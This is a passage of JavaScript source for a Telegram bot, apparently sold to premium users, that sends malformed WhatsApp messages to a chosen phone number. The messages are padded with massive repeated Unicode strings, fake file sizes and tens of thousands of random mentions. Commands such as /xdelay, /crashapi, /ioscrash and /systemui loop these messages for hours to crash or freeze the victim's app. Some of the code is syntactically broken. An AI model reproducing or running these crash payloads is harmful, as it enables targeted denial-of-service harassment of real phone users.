  await sock.relayMessage(jid, msg.message, {
    participant: { jid: jid },
    messageId: msg.key.id
  });
}

async function DelayInvis(sock, jid) {


    let venomModsData = JSON.stringify({
        status: true,
        criador: "Excell - Fvck",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    depayyCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOndepayyCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    let stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: `Excell - Fvck      - 〽${"ꥈㅤㅤꥈ".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `Excell - Fvck ${"﹏".repeat(100000)}`,
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: jid },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                    },
                    body: {
                        text: "\u0003" + "ꦽ".repeat(100000) + "\u0003".repeat(100000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                            { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
                        ]
                    }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };

    await sock.relayMessage(jid, message, { participant: { jid: jid } });
    
}



// Fungsi spam bug / trigger WA

//Funtion Ui Crash
async function xui(sock, jid, Ptcp = true){
await new Promise((resolve) => setTimeout(resolve, 1000)); 
  try {
    await sock.relayMessage(
      jid,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "Excell Not Found\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `wtf`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Wtf",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: jid },
        userJid: jid,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
// Blank Funtion

// Function Delay
async function xinvis(sock, jid, mention){
await new Promise((resolve) => setTimeout(resolve, 500));


    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "Fuck Him",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: 999999999999,
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(jid, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: jid },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            jid,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Excell Is Blocked You" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function xinvis3(sock, jid, mention){
 await new Promise((resolve) => setTimeout(resolve, 500)); 
    const msg = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "鈳� 饾悈 饾悽蜏廷蜖虌汀汀谈谭谭谭蜏廷 饾悕 饾悎 饾悧蜏廷-鈥�",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: ".Tama Ryuichi" + "貍賳貎貏俳貍賳貎".repeat(100),
                                    title: "Finix",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                    }
                ]
            }
        ]
    });

if (mention) {
        await sock.relayMessage(jid, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}
async function invisx(jid, mention, delayMs= 100)
{
   const sex = Array.from({ length: 9741 }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{ title: `${r + 1}`, id: r + 1 }],
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "dunia ini serasa sepi jika tidak denganmu",
                    listType: 2,
                    buttonText: null,
                    sections: sex,
                    singleSelectReply: { selectedRowId: "🌀" },
                    contextInfo: {
                        mentionedJid: Array.from(
                            { length: 9741 },
                            () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9741@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-",
                        },
                    },
                    description: "( # )",
                },
            },
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2,
        },
    };

    const msg = generateWAMessageFromContent(jid, MSG, {});

    // Tambahkan delay sebelum mengirim
    if (delayMs > 100) {
        await new Promise(resolve => setTimeout(resolve, delayMs));
    }

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: jid },
                                content: undefined,
                            },
                        ],
                    },
                ],
            },
        ],
    });

    if (mention) {
        if (delayMs > 100) {
            await new Promise(resolve => setTimeout(resolve, delayMs));
        }
        await sock.relayMessage(
            jid,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "𝚇𝚊𝚝𝚊 - 𝙳𝚎𝚕𝚊𝚢" }, //jangan ganti nanti error
                        content: undefined,
                    },
                ],
            }
        );
    }
}

async function durabledelay(sock, durationHours, jid) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
       }

        try {
    if (count < 355) {
        await Promise.all([
           xinvis3(sock, jid, false),
            ]);
       
        console.log(chalk.red(`Excell With Api ${count}/355 ke ${jid}`));
        count++;
        setTimeout(sendNext, 100);
    } else {
        console.log(chalk.green(`✅ Success Sending 355 Messages to ${jid}`));
        count = 0;
        console.log(chalk.red("➡️ Next 355 Messages"));
        setTimeout(sendNext, 100);
    }
} catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 100);
}
};

sendNext();
}
async function testdelay(sock, durationHours, jid) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
       }

        try {
    if (count < 355) {
        await Promise.all([
           test(sock, jid, false),
            ]);
       
        console.log(chalk.red(`delay no tag sw ${count}/355 ke ${jid}`));
        count++;
        setTimeout(sendNext, 100);
    } else {
        console.log(chalk.green(`✅ Success Sending 355 Messages to ${jid}`));
        count = 0;
        console.log(chalk.red("➡️ Next 355 Messages"));
        setTimeout(sendNext, 100);
    }
} catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 100);
}
};

sendNext();
}

async function delayapi(sock, durationHours, jid) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
       }

        try {
    if (count < 355) {
        await Promise.all([
           DelayInvis(sock, jid, false),
           waApi(sock, jid, false),
            ]);
       
        console.log(chalk.gray(`Excell With Api ${count}/355 ke ${jid}`));
        count++;
        setTimeout(sendNext, 100);
    } else {
        console.log(chalk.blue(`✅ Success Sending 355 Messages to ${jid}`));
        count = 0;
        console.log(chalk.gray("➡️ Next 355 Messages"));
        setTimeout(sendNext, 100);
    }
} catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 100);
}
};

sendNext();
}

async function ui(sock, jid) {
    for (let i = 0; i <= 35; i++) {
    
    await xui(sock, jid, Ptcp=true);
    await blank(sock, jid, ptcp = true)
   console.log(chalk.green(`✅ Success Sending Ui to ${jid}`));
    }
}
async function ipcrash(sock, jid)
await new Promise((resolve) => setTimeout(resolve, 1000));  {
    for (let i = 0; i <= 350; i++) {
    await ip(sock, jid);
    await ip1(sock, jid);
    await ip2(sock, jid);
    await ip3(sock, jid);
   
    }
}

async function apicrash(sock, jid) {
    for (let i = 0; i <= 1000; i++) { 
    await DelayInvis(sock, jid,);
    await waApi(sock, jid,);
    await HomeFc(sock, jid);
   console.log(chalk.green(`Sending ForceClose Api to ${jid}`));
    }

}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function isPremium(userId) {
  try {
    const premiumUsers = loadPremiumUsers();
    return premiumUsers.includes(userId.toString());
  } catch (error) {
    console.error("Error checking premium status:", error);
    return false;
  }
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `Hi I Am Excell Bug bot How to use?
  use the /menu command to bring up the menu`);
  
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});


        
 
bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



bot.onText(/\/xdelay(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    CARA PENGGUNAAN    
│────────────────
│ Format: /xdelay <nomor>
│ Contoh: /xdelay 628123456789
╰─────────────────\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;

    for (let i = 0; i < 1; i++) {
    await durabledelay(sock, 24, jid)
    }

    await bot.sendMessage(chatId, "Bug berhasil dikirim!");
  } catch (error) {
    console.error("Error in xdelay:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});
bot.onText(/\/crashapi(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    CARA PENGGUNAAN    
│────────────────
│ Format: /crashapi <nomor>
│ Contoh: /crashapi 628123456789
╰─────────────────\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;

    for (let i = 0; i < 1; i++) {
      await apicrash(sock, jid);

    }

    await bot.sendMessage(chatId, "Bug berhasil dikirim!");
  } catch (error) {
    console.error("Error in crashapi:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});
bot.onText(/\/ioscrash(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `╭─────────────────
│    CARA PENGGUNAAN    
│────────────────
│ Format: /ioscrash <nomor>
│ Contoh: /ioscrash 628123456789
╰─────────────────`,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;

    for (let i = 0; i < 2; i++) {
      await ipcrash(sock, jid);
      console.log(chalk.green(`✅ Success Sending Crash Iphone to ${jid}`));
    }

    await bot.sendMessage(chatId, "Bug berhasil dikirim!");
  } catch (error) {
    console.error("Error in Carousel:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});
bot.onText(/\/notag(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `╭─────────────────
│    CARA PENGGUNAAN    
│────────────────
│ Format: /notag <nomor>
│ Contoh: /notag 628123456789
╰─────────────────`,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;

    for (let i = 0; i < 1; i++) {
      await testdelay(sock, 24, jid);
      console.log(chalk.green(`✅ Success Sending Crash Iphone to ${jid}`));
    }

    await bot.sendMessage(chatId, "Bug berhasil dikirim!");
  } catch (error) {
    console.error("Error in Carousel:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});
bot.onText(/\/systemui(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `╭─────────────────
│    CARA PENGGUNAAN    
│────────────────
│ Format: /systemui <nomor>
│ Contoh: /systemui 628123456789
╰─────────────────`,
      { parse_mode: "Markdown" }
    );
  }

  const target = match[1];
  const formattedNumber = target.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }

    const sock = sessions.values().next().value;

    for (let i = 0; i < 40; i++) {
      await xui(sock, jid, Ptcp = true);
      console.log(chalk.green(`✅ Success Sending Ui to ${jid}`));
   
    }

    await bot.sendMessage(chatId, "Bug berhasil dikirim!");
  } catch (error) {
    console.error("Error in systemui:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

const mainMenuButtons = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "OWNER MENU", callback_data: "owner" },
        { text: "BUG MENU", callback_data: "bugmenu" },
      ],
      [
      { text: "Devoloper", url: "t.me/deakof" },
      { text: "Channel Info", url: "t.me/js4hard" }
      ],
      [
        { text: "Tanks - To", callback_data: "tq" },
      ],
    ],
  },
};

const menuWithBackButton = {
  reply_markup: {
    inline_keyboard: [
      [{ text: "⬅️ Back", callback_data: "back" }],
    ],
  },
};

function checkAndGetImagePath(imageName) {
  const imagePath = path.join(__dirname, "assets", "images", imageName);
  if (!fs.existsSync(imagePath)) {
    throw new Error("File gambar tidak ditemukan");
  }
  return imagePath;
}

bot.onText(/\/menu/, async (msg) => {
  const chatId = msg.chat.id;
  const timescale = getUptime();
  try {
    const imagePath = checkAndGetImagePath("thumb.jpeg");
    await bot.sendPhoto(chatId, fs.createReadStream(imagePath), {
      caption: `\`\`\`
Привет, я бот, который полезен для отправки ошибок WhatsApp через бота Telegram, я был создан @deakof. Я прошу вас использовать этого бота разумно и ответственно, наслаждайтесь.

╔━━━━━━━━━━━━━━━━━━━━━
┃々 Name : Fvck Murderer
┃々 Dᴇᴠᴇʟᴏᴘᴇʀ : Excell inc.
┃々 Vᴇʀsɪᴏɴ : 1.9
┃々 𝙾𝚗𝚕𝚒𝚗𝚎 : ${timescale}
╚━━━━━━━━━━━━━━━━━━━━━━\`\`\``,
      parse_mode: "Markdown",
      ...mainMenuButtons,
    });
  } catch (error) {
    console.error("Error sending menu:", error);
    await bot.sendMessage(
      chatId,
      `\`\`\`
Привет, я бот, который полезен для отправки ошибок WhatsApp через бота Telegram, я был создан @deakof. Я прошу вас использовать этого бота разумно и ответственно, наслаждайтесь.

╔━━━━━━━━━━━━━━━━━━━━━
┃々 Name : Fvck Murderer
┃々 Dᴇᴠᴇʟᴏᴘᴇʀ : Excell inc.
┃々 Vᴇʀsɪᴏɴ : 1.9
┃々 𝙾𝚗𝚕𝚒𝚗𝚎 : ${timescale}
╚━━━━━━━━━━━━━━━━━━━━━━\`\`\``,
      {
        parse_mode: "Markdown",
        ...mainMenuButtons,
      }
    );
  }
});

bot.on("callback_query", async (query) => {
  await bot.answerCallbackQuery(query.id).catch(console.error);
 const timescale = getUptime();
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;

  let caption;
  let buttons;

  try {
    const imagePath = checkAndGetImagePath("thumb.jpeg");
    switch (query.data) {
      case "owner":
        caption = `\`\`\`
╭─────────────────
│    OWNER MENU    
│────────────────
│ /addprem <id>
│ /delprem <id>
│ /addowner <id>
│ /delowner <id>
╰─────────────────\`\`\``;
        buttons = menuWithBackButton;
        break;

      case "bugmenu":
        caption = `\`\`\`
╭─────────────────
│    BUG MENU    
│────────────────
│ /xdelay <number>
│ /crashapi <nunber>
│ /notag <nunber>
│ /systemui <number>
│ /ioscrash <number>
╰─────────────────\`\`\``;
        buttons = menuWithBackButton;
        break;
case "tq":
        caption = `\`\`\`
      TANKS - TO
╭────────────────
│ Excell <Pengembang>
│ Rasya <Best Support>
│ Unren <Owner Lotus>
│ And Tanks To All Buyer
╰─────────────────\`\`\``;
        buttons = menuWithBackButton;
        break;
        
      case "back":
        caption = `\`\`\`
Привет, я бот, который полезен для отправки ошибок WhatsApp через бота Telegram, я был создан @deakof. Я прошу вас использовать этого бота разумно и ответственно, наслаждайтесь.

╔━━━━━━━━━━━━━━━━━━━━━
┃々 Name : Fvck Murderer
┃々 Dᴇᴠᴇʟᴏᴘᴇʀ : Excell inc.
┃々 Vᴇʀsɪᴏɴ : 1.9
┃々 𝙾𝚗𝚕𝚒𝚗𝚎 : ${timescale}
╚━━━━━━━━━━━━━━━━━━━━━━\`\`\``;
        buttons = mainMenuButtons;
        break;
    }

    await bot.editMessageCaption(caption, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
      ...buttons,
    });
  } catch (error) {
    console.error("Error handling callback query:", error);
    await bot.sendMessage(chatId, caption, {
      parse_mode: "Markdown",
      ...buttons,
    });
  }
});

bot.onText(/\/addprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const userId = match[1].trim();

  try {
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers.includes(userId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${userId} sudah
│ terdaftar sebagai premium
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    premiumUsers.push(userId);
    savePremiumUsers(premiumUsers);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENAMBAHKAN
│────────────────
│ ID: ${userId}
│ Status: Premium User
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding premium user:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan user premium. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const userId = match[1].trim();

  try {
